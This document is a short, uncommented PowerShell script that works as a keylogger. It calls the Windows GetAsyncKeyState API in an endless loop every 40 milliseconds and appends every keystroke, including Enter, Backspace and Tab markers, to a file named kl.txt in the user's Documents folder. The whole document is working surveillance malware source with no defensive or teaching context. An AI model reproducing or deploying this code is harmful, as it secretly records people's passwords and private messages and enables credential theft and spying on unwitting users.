$DocPath = [Environment]::GetFolderPath("MyDocuments")
$LogPath = Join-Path $DocPath "kl.txt"


$Signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@

$API = Add-Type -MemberDefinition $Signatures -Name 'Win32' -Namespace API -PassThru


while ($true) {
    Start-Sleep -Milliseconds 40  
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $KeyState = $API::GetAsyncKeyState($ascii)

        
        if ($KeyState -eq -32767) {
            $key = [char]$ascii

        
            switch ($ascii) {
                13 { $key = "`r`n[ENTER]`r`n" }
                32 { $key = " " }
                8  { $key = "[BACKSPACE]" }
                9  { $key = "[TAB]" }
            }

           $key | Out-File -FilePath $LogPath -Append -NoNewline
        }
    }

}
